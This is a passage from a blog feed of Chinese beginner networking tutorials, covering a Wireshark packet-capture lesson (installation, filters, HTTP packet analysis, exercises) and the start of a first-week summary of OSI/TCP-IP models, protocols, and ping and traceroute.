    <content type="html"><![CDATA[<h1>第7天：Wireshark抓包入门</h1><blockquote><p>“看见网络数据包的流动，就像看见了互联网的血液循环。”</p></blockquote><h2 id="📚-今日目标">📚 今日目标</h2><ul><li>学会安装和使用Wireshark</li><li>掌握基本的抓包和过滤技巧</li><li>能够分析HTTP请求过程</li><li>理解各层协议在实际数据包中的呈现</li></ul><h2 id="🎯-什么是Wireshark？">🎯 什么是Wireshark？</h2><p><strong>Wireshark</strong>是世界上最流行的网络协议分析工具（也叫抓包工具）。</p><h3 id="生活中的例子">生活中的例子</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Wireshark = 网络显微镜<br><br>就像医生用显微镜观察血液：<br><span class="hljs-bullet">- </span>看到红细胞、白细胞<br><span class="hljs-bullet">- </span>分析血液成分<br><span class="hljs-bullet">- </span>诊断健康问题<br><br>Wireshark让你看到网络数据包：<br><span class="hljs-bullet">- </span>看到TCP、HTTP、DNS包<br><span class="hljs-bullet">- </span>分析数据内容<br><span class="hljs-bullet">- </span>诊断网络问题<br></code></pre></td></tr></table></figure><h3 id="Wire">Wire</h3><p>shark的特点</p><ul><li>🔍 <strong>可视化</strong>：图形界面，易于使用</li><li>🎨 <strong>彩色显示</strong>：不同协议不同颜色</li><li>🔎 <strong>强大过滤</strong>：快速找到需要的包</li><li>📊 <strong>统计分析</strong>：流量统计、协议分布</li><li>💾 <strong>保存分析</strong>：可以保存抓包文件</li><li>🌐 <strong>跨平台</strong>：支持Windows、Mac、Linux</li></ul><h2 id="🔧-安装Wireshark">🔧 安装Wireshark</h2><h3 id="下载">下载</h3><p>访问官网：<a href="https://www.wireshark.org/">https://www.wireshark.org/</a></p><h3 id="各平台安装">各平台安装</h3><p><strong>Windows</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 下载.exe安装包<br><span class="hljs-bullet">2.</span> 双击安装<br><span class="hljs-bullet">3.</span> 安装过程中选择安装WinPcap或Npcap（必需）<br><span class="hljs-bullet">4.</span> 完成后重启计算机<br></code></pre></td></tr></table></figure><p><strong>Mac</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 下载.dmg文件<br><span class="hljs-bullet">2.</span> 拖动到Applications文件夹<br><span class="hljs-bullet">3.</span> 首次运行可能需要在系统偏好设置中允许<br></code></pre></td></tr></table></figure><p><strong>Linux（Ubuntu/Debian）</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install wireshark<br><br><span class="hljs-comment"># 添加当前用户到wireshark组</span><br><span class="hljs-built_in">sudo</span> usermod -aG wireshark <span class="hljs-variable">$USER</span><br><br><span class="hljs-comment"># 重新登录生效</span><br></code></pre></td></tr></table></figure><h2 id="📖-Wireshark界面介绍">📖 Wireshark界面介绍</h2><h3 id="主界面布局">主界面布局</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌─────────────────────────────────────────────────────────┐<br>│  菜单栏: 文件 编辑 查看 捕获 分析 统计 帮助         │<br>├─────────────────────────────────────────────────────────┤<br>│  工具栏: [开始] [停止] [重启] [保存] ...                │<br>├─────────────────────────────────────────────────────────┤<br>│  过滤器: [___________________________] [应用]           │<br>├─────────────────────────────────────────────────────────┤<br>│  ① 数据包列表区（Packet List）                          │<br>│  No.  Time     Source      Destination  Protocol Info   │<br>│ <span class="hljs-number"> 1 </span>   0.000    192.168.1.1 192.168.1.2  TCP      SYN    │<br>│ <span class="hljs-number"> 2 </span>   0.001    192.168.1.2 192.168.1.1  TCP      ACK    │<br>├─────────────────────────────────────────────────────────┤<br>│  ② 数据包详情区（Packet Details）                       │<br>│  ▶ Frame 1:<span class="hljs-number"> 74 </span>bytes on wire                            │<br>│  ▶ Ethernet II, Src: aa:bb:cc:dd:ee:ff                  │<br>│  ▶ Internet Protocol Version<span class="hljs-number"> 4 </span>                         │<br>│  ▶ Transmission Control Protocol                        │<br>├─────────────────────────────────────────────────────────┤<br>│  ③ 十六进制数据区（Packet Bytes）                       │<br>│ <span class="hljs-number"> 0000 </span><span class="hljs-number"> 00 </span>0c<span class="hljs-number"> 29 </span>6f 6c<span class="hljs-number"> 92 </span>00 0c<span class="hljs-number"> 29 </span>5b 3f e8<span class="hljs-number"> 08 </span>00<span class="hljs-number"> 45 </span>00 │<br>│ <span class="hljs-number"> 0010 </span><span class="hljs-number"> 00 </span>3c f9<span class="hljs-number"> 68 </span>40<span class="hljs-number"> 00 </span>40<span class="hljs-number"> 06 </span>38<span class="hljs-number"> 57 </span>c0 a8<span class="hljs-number"> 01 </span>64 c0 a8 │<br>└─────────────────────────────────────────────────────────┘<br></code></pre></td></tr></table></figure><h3 id="三大区域">三大区域</h3><ol><li><strong>数据包列表区</strong>：显示捕获的所有包</li><li><strong>数据包详情区</strong>：显示选中包的协议层次结构</li><li><strong>十六进制数据区</strong>：显示原始字节数据</li></ol><h2 id="🔍-开始第一次抓包">🔍 开始第一次抓包</h2><h3 id="步骤1：选择网络接口">步骤1：选择网络接口</h3><ol><li>启动Wireshark</li><li>在主界面看到网络接口列表</li><li>选择正在使用的接口（有流量波形的）<ul><li>WiFi：通常是 <code>en0</code>（Mac）或 <code>wlan0</code>（Linux）</li><li>有线：通常是 <code>eth0</code> 或 <code>en0</code></li></ul></li></ol><h3 id="步骤2：开始捕获">步骤2：开始捕获</h3><p>点击接口名称或点击工具栏的&quot;开始捕获&quot;按钮（鲨鱼鳍图标）</p><h3 id="步骤3：生成流量">步骤3：生成流量</h3><p>在浏览器中访问：<a href="http://www.example.com">http://www.example.com</a></p><h3 id="步骤4：停止捕获">步骤4：停止捕获</h3><p>点击工具栏的&quot;停止捕获&quot;按钮（红色方块）</p><h2 id="🎨-认识颜色代码">🎨 认识颜色代码</h2><p>Wireshark用颜色区分不同类型的包：</p><table><thead><tr><th>颜色</th><th>协议/类型</th><th>含义</th></tr></thead><tbody><tr><td>浅紫色</td><td>TCP</td><td>TCP协议</td></tr><tr><td>浅蓝色</td><td>UDP</td><td>UDP协议</td></tr><tr><td>黑色</td><td>有问题的包</td><td>校验和错误、重传等</td></tr><tr><td>浅绿色</td><td>HTTP</td><td>HTTP协议</td></tr><tr><td>浅黄色</td><td>Windows特定</td><td>NetBIOS、SMB等</td></tr><tr><td>深灰色</td><td>TCP重传</td><td>数据包重传</td></tr></tbody></table><h2 id="🔎-过滤器使用">🔎 过滤器使用</h2><h3 id="显示过滤器（Display-Filter）">显示过滤器（Display Filter）</h3><p><strong>在工具栏的过滤器框中输入</strong>，用于过滤已捕获的包。</p><h4 id="常用过滤器">常用过滤器</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 只显示HTTP</span><br><span class="hljs-attribute">http</span><br><br><span class="hljs-comment"># 只显示TCP</span><br>tcp<br><br><span class="hljs-comment"># 只显示特定IP</span><br>ip.addr == <span class="hljs-number">192.168.1.100</span><br><br><span class="hljs-comment"># 只显示源IP</span><br>ip.src == <span class="hljs-number">192.168.1.100</span><br><br><span class="hljs-comment"># 只显示目标IP</span><br>ip.dst == <span class="hljs-number">8.8.8.8</span><br><br><span class="hljs-comment"># 只显示特定端口</span><br>tcp.port == <span class="hljs-number">80</span><br><br><span class="hljs-comment"># 组合条件（AND）</span><br>ip.addr == <span class="hljs-number">192.168.1.100</span> &amp;&amp; tcp.port == <span class="hljs-number">80</span><br><br><span class="hljs-comment"># 组合条件（OR）</span><br>http || dns<br><br><span class="hljs-comment"># 排除（NOT）</span><br>!arp<br><br><span class="hljs-comment"># HTTP GET请求</span><br>http.request.method == <span class="hljs-string">&quot;GET&quot;</span><br><br><span class="hljs-comment"># DNS查询</span><br>dns.flags.response == <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="捕获过滤器（Capture-Filter）">捕获过滤器（Capture Filter）</h3><p><strong>在开始捕获前设置</strong>，只捕获符合条件的包。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 只捕获80端口</span><br><span class="hljs-attribute">port</span> <span class="hljs-number">80</span><br><br><span class="hljs-comment"># 只捕获特定主机</span><br><span class="hljs-attribute">host</span> <span class="hljs-number">192.168.1.100</span><br><br><span class="hljs-comment"># 只捕获TCP</span><br><span class="hljs-attribute">tcp</span><br><br><span class="hljs-comment"># 组合条件</span><br><span class="hljs-attribute">host</span> <span class="hljs-number">192.168.1.100</span> and port <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h2 id="🔬-实战：分析HTTP请求">🔬 实战：分析HTTP请求</h2><p>让我们实际抓取并分析一个HTTP请求！</p><h3 id="步骤1：设置过滤器">步骤1：设置过滤器</h3><p>在开始前，设置显示过滤器：<code>http</code></p><h3 id="步骤2：开始捕获-2">步骤2：开始捕获</h3><p>点击开始按钮</p><h3 id="步骤3：访问网站">步骤3：访问网站</h3><p>在浏览器访问：<a href="http://www.example.com">http://www.example.com</a><br>（注意：必须是http，不是https）</p><h3 id="步骤4：停止并分析">步骤4：停止并分析</h3><p>停止捕获，你会看到HTTP请求和响应。</p><h3 id="分析HTTP-GET请求">分析HTTP GET请求</h3><p>找到一个HTTP GET请求包，点击它：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">在数据包详情区，你会看到：</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">▶ Frame 123</span><span class="hljs-punctuation">:</span> <span class="hljs-string">502 bytes on wire</span><br>  <span class="hljs-attribute">├─ 物理层信息</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">▶ Ethernet II</span><br><span class="hljs-attribute">  ├─ Destination</span><span class="hljs-punctuation">:</span> <span class="hljs-string">xx:xx:xx:xx:xx:xx</span><br>  <span class="hljs-attribute">├─ Source</span><span class="hljs-punctuation">:</span> <span class="hljs-string">yy:yy:yy:yy:yy:yy</span><br>  <span class="hljs-attribute">└─ Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">IPv4 (0x0800)</span><br>    <span class="hljs-comment"># 数据链路层：MAC地址</span><br><br><span class="hljs-attribute">▶ Internet Protocol Version 4</span><br><span class="hljs-attribute">  ├─ Source</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.1.100</span><br>  <span class="hljs-attribute">├─ Destination</span><span class="hljs-punctuation">:</span> <span class="hljs-string">93.184.216.34</span><br>  <span class="hljs-attribute">├─ Protocol</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TCP (6)</span><br>  <span class="hljs-attribute">└─ TTL</span><span class="hljs-punctuation">:</span> <span class="hljs-string">64</span><br>    <span class="hljs-comment"># 网际层：IP地址</span><br><br><span class="hljs-attribute">▶ Transmission Control Protocol</span><br><span class="hljs-attribute">  ├─ Source Port</span><span class="hljs-punctuation">:</span> <span class="hljs-string">54321</span><br>  <span class="hljs-attribute">├─ Destination Port</span><span class="hljs-punctuation">:</span> <span class="hljs-string">80</span><br>  <span class="hljs-attribute">├─ Sequence number</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>  <span class="hljs-attribute">└─ Flags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x018 (PSH, ACK)</span><br>    <span class="hljs-comment"># 传输层：端口号</span><br><br><span class="hljs-attribute">▶ Hypertext Transfer Protocol</span><br><span class="hljs-attribute">  ├─ GET / HTTP/1.1\r\n</span><br><span class="hljs-attribute">  ├─ Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">www.example.com\r\n</span><br>  <span class="hljs-attribute">├─ User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0...\r\n</span><br>  <span class="hljs-attribute">├─ Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">text/html...\r\n</span><br>  └─ \r\n<br>    <span class="hljs-comment"># 应用层：HTTP协议</span><br></code></pre></td></tr></table></figure><p><strong>看到了什么？</strong></p><ul><li>✅ 完整的TCP/IP四层结构！</li><li>✅ 每一层的头部信息</li><li>✅ HTTP请求的完整内容</li></ul><h3 id="分析HTTP响应">分析HTTP响应</h3><p>找到对应的HTTP响应包：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">▶ Hypertext Transfer Protocol<br>  ├─ HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK\<span class="hljs-attribute">r</span>\n<br>  ├─ Content-Type: text/html\<span class="hljs-attribute">r</span>\n<br>  ├─ Content-Length: <span class="hljs-number">1256</span>\<span class="hljs-attribute">r</span>\n<br>  ├─ Server: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span>\<span class="hljs-attribute">r</span>\n<br>  └─ \<span class="hljs-attribute">r</span>\n<br>  └─ <span class="hljs-selector-attr">[HTML content]</span><br></code></pre></td></tr></table></figure><h2 id="💡-实用技巧">💡 实用技巧</h2><h3 id="1-跟踪TCP流">1. 跟踪TCP流</h3><p>右键点击一个TCP包 → Follow → TCP Stream</p><p><strong>作用</strong>：查看完整的TCP会话内容（所有来回的数据）</p><h3 id="2-统计信息">2. 统计信息</h3><p>菜单：Statistics → Protocol Hierarchy</p><p><strong>作用</strong>：查看各种协议的流量占比</p><h3 id="3-导出对象">3. 导出对象</h3><p>菜单：File → Export Objects → HTTP</p><p><strong>作用</strong>：提取HTTP传输的文件（图片、HTML等）</p><h3 id="4-时间列显示">4. 时间列显示</h3><p>右键点击Time列 → Display Format → 选择格式</p><p><strong>推荐</strong>：选择&quot;Seconds Since Previous Displayed Packet&quot;查看包间隔</p><h3 id="5-查找包">5. 查找包</h3><p>Ctrl+F（Windows/Linux）或 Cmd+F（Mac）</p><p>可以搜索：</p><ul><li>显示过滤器</li><li>十六进制值</li><li>字符串</li></ul><h2 id="🎓-知识小结">🎓 知识小结</h2><h3 id="今天学到了什么？">今天学到了什么？</h3><ol><li>✅ Wireshark是最强大的网络协议分析工具</li><li>✅ 可以看到每个数据包的完整结构</li><li>✅ 过滤器可以快速定位需要的包</li><li>✅ 可以分析HTTP、TCP、IP等各层协议</li><li>✅ 实际验证了前几天学习的协议知识</li></ol><h3 id="重要概念">重要概念</h3><table><thead><tr><th>概念</th><th>含义</th><th>用途</th></tr></thead><tbody><tr><td>抓包</td><td>捕获网络数据包</td><td>分析网络行为</td></tr><tr><td>显示过滤器</td><td>过滤已捕获的包</td><td>查看特定包</td></tr><tr><td>捕获过滤器</td><td>只捕获特定的包</td><td>减少文件大小</td></tr><tr><td>跟踪流</td><td>查看完整会话</td><td>理解通信过程</td></tr></tbody></table><h3 id="常用过滤器速查">常用过滤器速查</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 协议过滤</span><br>http, tcp, udp, dns, icmp<br><br><span class="hljs-comment"># IP过滤</span><br>ip.addr == 192.168.1.1<br>ip.src == 192.168.1.1<br>ip.dst == 8.8.8.8<br><br><span class="hljs-comment"># 端口过滤</span><br>tcp.port == 80<br>tcp.srcport == 80<br>tcp.dstport == 443<br><br><span class="hljs-comment"># HTTP过滤</span><br>http.request<br>http.response<br>http.request.method == <span class="hljs-string">&quot;POST&quot;</span><br><br><span class="hljs-comment"># 逻辑运算</span><br>&amp;&amp; (AND)<br>|| (OR)<br>! (NOT)<br></code></pre></td></tr></table></figure><h2 id="💪-练习题">💪 练习题</h2><h3 id="练习1：基础抓包">练习1：基础抓包</h3><ol><li>抓取访问baidu.com的数据包</li><li>找到DNS查询包</li><li>找到TCP三次握手的三个包</li><li>找到HTTP请求和响应</li></ol><h3 id="练习2：过滤器练习">练习2：过滤器练习</h3><p>使用过滤器完成以下任务：</p><ol><li>只显示你的电脑发送的包</li><li>只显示HTTP POST请求</li><li>显示所有到8.8.8.8的包</li><li>显示DNS查询但不显示响应</li></ol><h3 id="练习3：协议分析">练习3：协议分析</h3><p>抓取一个完整的HTTP请求，分析：</p><ol><li>TCP三次握手过程</li><li>HTTP请求头部内容</li><li>HTTP响应状态码</li><li>TCP四次挥手过程</li></ol><h3 id="练习4：进阶任务">练习4：进阶任务</h3><ol><li>导出一个网页传输的图片</li><li>统计5分钟内各协议的流量占比</li><li>找出延迟最大的数据包</li><li>分析一个TCP重传的包</li></ol><h2 id="📚-扩展阅读">📚 扩展阅读</h2><h3 id="为什么HTTPS不能抓包？">为什么HTTPS不能抓包？</h3><p>HTTPS是加密的：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTP:  明文传输，Wireshark可以看到内容<br>HTTPS: 加密传输，Wireshark只能看到加密数据<br><br>要抓取HTTPS内容需要：<br><span class="hljs-bullet">1.</span> 安装证书<br><span class="hljs-bullet">2.</span> 配置浏览器导出密钥<br><span class="hljs-bullet">3.</span> 在Wireshark中配置SSL密钥日志<br></code></pre></td></tr></table></figure><h3 id="Wireshark的替代工具">Wireshark的替代工具</h3><ul><li><strong>tcpdump</strong>：命令行抓包工具</li><li><strong>Charles</strong>：专注HTTP/HTTPS的工具</li><li><strong>Fiddler</strong>：Windows上的HTTP调试工具</li><li><strong>mitmproxy</strong>：命令行的中间人代理</li></ul><h3 id="实际应用场景">实际应用场景</h3><ol><li><strong>Web开发调试</strong>：查看HTTP请求和响应</li><li><strong>网络故障排查</strong>：分析丢包、延迟</li><li><strong>安全分析</strong>：检测异常流量</li><li><strong>学习协议</strong>：深入理解网络协议</li><li><strong>性能优化</strong>：分析网络瓶颈</li></ol><h2 id="🎯-下一步：第一周总结">🎯 下一步：第一周总结</h2><p><strong>明天我们将总结第一周的所有内容！</strong></p><p>回顾：</p><ul><li>网络基础概念</li><li>OSI和TCP/IP模型</li><li>ping和traceroute命令</li><li>Wireshark抓包分析</li></ul><p>准备好进行第一周的综合测验了吗？</p><hr><p>💡 <strong>今日金句</strong>：Wireshark让不可见的网络数据包变得可见！</p><p>👉 <a href="day06.md">上一天：traceroute详解</a> | <a href="../../README.md">返回目录</a> | <a href="week_summary.md">下一天：第一周总结</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一周总结：网络基础入门</title>
    <link href="/2025/11/10/%E4%B8%80%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"/>
    <url>/2025/11/10/%E4%B8%80%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1>第一周总结：网络基础入门</h1><blockquote><p>“万丈高楼平地起，扎实基础是关键。”</p></blockquote><h2 id="🎯-本周回顾">🎯 本周回顾</h2><p>恭喜你完成了第一周的学习！让我们回顾一下这一周的精彩内容。</p><h3 id="📚-本周学习内容">📚 本周学习内容</h3><table><thead><tr><th>天数</th><th>主题</th><th>核心内容</th><th>实战项目</th></tr></thead><tbody><tr><td>第1天</td><td>认识计算机网络</td><td>网络基本概念、作用</td><td>网络连接检测工具</td></tr><tr><td>第2天</td><td>网络分类和拓扑</td><td>LAN/WAN/MAN、拓扑结构</td><td>局域网设备扫描器</td></tr><tr><td>第3天</td><td>OSI七层模型</td><td>七层结构、数据封装</td><td>协议分层演示</td></tr><tr><td>第4天</td><td>TCP/IP四层模型</td><td>实际应用模型、协议</td><td>数据包分析器</td></tr><tr><td>第5天</td><td>ping命令</td><td>ICMP协议、RTT</td><td>简易ping工具</td></tr><tr><td>第6天</td><td>traceroute命令</td><td>路由追踪、TTL</td><td>简易traceroute工具</td></tr><tr><td>第7天</td><td>Wireshark抓包</td><td>抓包分析、过滤器</td><td>实际抓包分析</td></tr></tbody></table><h2 id="📖-知识点总结">📖 知识点总结</h2><h3 id="1-网络基础概念">1. 网络基础概念</h3><p><strong>什么是计算机网络？</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">计算机网络 = 多台计算机通过通信线路连接<br><span class="hljs-bullet">             +</span> 共享资源<br><span class="hljs-bullet">             +</span> 交换信息<br></code></pre></td></tr></table></figure><p><strong>网络的分类</strong>：</p><ul><li>LAN（局域网）：家庭、办公室（几米到几公里）</li><li>MAN（城域网）：城市范围（几十公里）</li><li>WAN（广域网）：跨国、跨洲（几百到几万公里）</li></ul><p><strong>网络拓扑结构</strong>：</p><ul><li>总线型：所有设备连在一条线上</li><li>星型：所有设备连到中心节点（最常用）</li><li>环型：设备首尾相连成环</li><li>网状型：设备互相连接</li><li>树型：分层结构</li></ul><h3 id="2-OSI七层模型">2. OSI七层模型</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino">第<span class="hljs-number">7</span>层 - 应用层（Application）      → HTTP, FTP, DNS<br>第<span class="hljs-number">6</span>层 - 表示层（Presentation）     → 加密, 压缩<br>第<span class="hljs-number">5</span>层 - 会话层（Session）          → 会话管理<br>第<span class="hljs-number">4</span>层 - 传输层（Transport）        → TCP, UDP<br>第<span class="hljs-number">3</span>层 - 网络层（Network）          → IP, ICMP<br>第<span class="hljs-number">2</span>层 - 数据链路层（Data Link）    → <span class="hljs-built_in">Ethernet</span>, <span class="hljs-built_in">WiFi</span><br>第<span class="hljs-number">1</span>层 - 物理层（Physical）         → 网线, 光纤<br></code></pre></td></tr></table></figure><p><strong>记忆口诀</strong>：应表会传网数物</p><p><strong>数据封装过程</strong>：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">应用数据 → [传输层头|<span class="hljs-string">数据] → [网络层头</span>|<span class="hljs-string">传输层头</span>|<span class="hljs-string">数据]</span><br><span class="hljs-string">→ [链路层头</span>|<span class="hljs-string">网络层头</span>|<span class="hljs-string">传输层头</span>|<span class="hljs-string">数据</span>|<span class="hljs-string">链路层尾]</span><br></code></pre></td></tr></table></figure><h3 id="3-TCP-IP四层模型">3. TCP/IP四层模型</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino">┌────────────────┐<br>│  应用层        │  HTTP, DNS, FTP, SSH<br>├────────────────┤<br>│  传输层        │  TCP, UDP<br>├────────────────┤<br>│  网际层        │  IP, ICMP, ARP<br>├────────────────┤<br>│  网络接口层    │  <span class="hljs-built_in">Ethernet</span>, <span class="hljs-built_in">WiFi</span><br>└────────────────┘<br></code></pre></td></tr></table></figure><p><strong>TCP/IP vs OSI</strong>：</p><ul><li>OSI：理论模型（7层）</li><li>TCP/IP：实际使用（4层）</li></ul><h3 id="4-关键协议">4. 关键协议</h3><h4 id="IP协议（Internet-Protocol）">IP协议（Internet Protocol）</h4><ul><li>作用：寻址和路由</li><li>IP地址：192.168.1.100</li><li>版本：IPv4（32位）、IPv6（128位）</li></ul><h4 id="TCP协议（Transmission-Control-Protocol）">TCP协议（Transmission Control Protocol）</h4><ul><li>作用：可靠传输</li><li>特点：面向连接、可靠、有序</li><li>端口：标识应用程序</li></ul><h4 id="UDP协议（User-Datagram-Protocol）">UDP协议（User Datagram Protocol）</h4><ul><li>作用：快速传输</li><li>特点：无连接、不可靠、简单快速</li></ul><h4 id="ICMP协议（Internet-Control-Message-Protocol）">ICMP协议（Internet Control Message Protocol）</h4><ul><li>作用：错误报告、网络诊断</li><li>应用：ping、traceroute</li></ul><h4 id="HTTP协议（Hypertext-Transfer-Protocol）">HTTP协议（Hypertext Transfer Protocol）</h4><ul><li>作用：网页传输</li><li>端口：80（HTTP）、443（HTTPS）</li><li>方法：GET、POST、PUT、DELETE等</li></ul><h3 id="5-重要概念">5. 重要概念</h3><p><strong>MAC地址</strong>：</p><ul><li>网卡的物理地址</li><li>格式：AA:BB:CC:DD:EE:FF</li><li>作用：局域网内通信</li></ul><p><strong>IP地址</strong>：</p><ul><li>网络中设备的逻辑地址</li><li>格式：192.168.1.1</li><li>作用：跨网络通信</li></ul><p><strong>端口号</strong>：</p><ul><li>标识主机上的应用程序</li><li>范围：0-65535</li><li>常用：80(HTTP)、443(HTTPS)、22(SSH)</li></ul><p><strong>TTL（Time To Live）</strong>：</p><ul><li>数据包的生存时间</li><li>每经过一个路由器减1</li><li>为0时被丢弃</li></ul><p><strong>RTT（Round-Trip Time）</strong>：</p><ul><li>往返时间</li><li>从发送到收到回复的时间</li><li>单位：毫秒(ms)</li></ul><h3 id="6-网络工具">6. 网络工具</h3><p><strong>ping</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 测试连通性</span><br>ping baidu.com<br><br><span class="hljs-comment"># 发送4个包</span><br>ping -c 4 baidu.com  <span class="hljs-comment"># Linux/Mac</span><br>ping -n 4 baidu.com  <span class="hljs-comment"># Windows</span><br></code></pre></td></tr></table></figure><p><strong>traceroute</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 追踪路由路径</span><br>traceroute baidu.com  <span class="hljs-comment"># 